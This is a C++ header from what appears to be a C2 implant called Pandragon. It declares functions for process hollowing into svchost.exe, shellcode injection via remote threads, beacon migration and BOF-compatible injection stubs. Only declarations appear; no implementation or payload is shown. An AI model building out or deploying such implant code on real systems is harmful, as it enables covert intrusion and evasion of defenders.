/*
 * Process Injection, Hollowing, and Migration
 */

#ifndef PANDRAGON_INJECTION_H
#define PANDRAGON_INJECTION_H

#include "resolver.h"
#include <cstdint>

/* ============================================================================
 * Constants
 * ============================================================================ */

static constexpr SIZE_T MAX_HOLLOWING_PAYLOAD = 10 * 1024 * 1024;  // 10MB max

/* ============================================================================
 * Public API
 * ============================================================================ */

/**
 * Process hollowing: spawn suspended process, unmap original, map payload, resume.
 *
 * @param nt           functionTable with resolved APIs
 * @param targetPath   Wide path to target executable (e.g., L"C:\\Windows\\System32\\svchost.exe")
 * @param payload      Pointer to PE payload (in-memory format, not raw file)
 * @param payloadSize  Size of payload in bytes
 * @param outProcess   Optional output: process handle
 * @param outThread    Optional output: thread handle
 * @return TRUE on success
 */
BOOL ProcessHollow(functionTable* nt, const wchar_t* targetPath,
                   const uint8_t* payload, SIZE_T payloadSize,
                   HANDLE* outProcess = nullptr, HANDLE* outThread = nullptr);

/**
 * Classic process injection: open, allocate, write, create remote thread.
 *
 * @param nt             functionTable with resolved APIs
 * @param pid            Target process ID
 * @param shellcode      Pointer to shellcode
 * @param shellcodeSize  Size of shellcode
 * @param outProcess     Optional output: process handle
 * @param outThread      Optional output: thread handle
 * @return TRUE on success
 */
BOOL InjectIntoProcess(functionTable* nt, DWORD pid,
                       const uint8_t* shellcode, SIZE_T shellcodeSize,
                       HANDLE* outProcess = nullptr, HANDLE* outThread = nullptr);

/**
 * Process migration: spawn new beacon in target, transfer state.
 *
 * @param nt                functionTable with resolved APIs
 * @param targetPath        Wide path to target executable
 * @param beaconPayload     Beacon PE payload (in-memory format)
 * @param beaconPayloadSize Size of beacon payload
 * @return TRUE on success
 */
BOOL MigrateBeacon(functionTable* nt, const wchar_t* targetPath,
                   const uint8_t* beaconPayload, SIZE_T beaconPayloadSize);

/**
 * Set the global functionTable for injection module.
 * Called during beacon initialization.
 */
void SetInjectionfuncTable(functionTable* nt);

/**
 * Get the global functionTable from injection module.
 * Used by BOF compatibility layer.
 */
functionTable* getFuncTableFromGlobal();

/* ============================================================================
 * BOF Compatibility Stubs (implemented in injection.cpp)
 * ============================================================================ */

extern "C" {
    void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len,
                              int p_offset, char* arg, int a_len);
    void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                       int p_len, int p_offset, char* arg, int a_len);
}

#endif /* PANDRAGON_INJECTION_H */
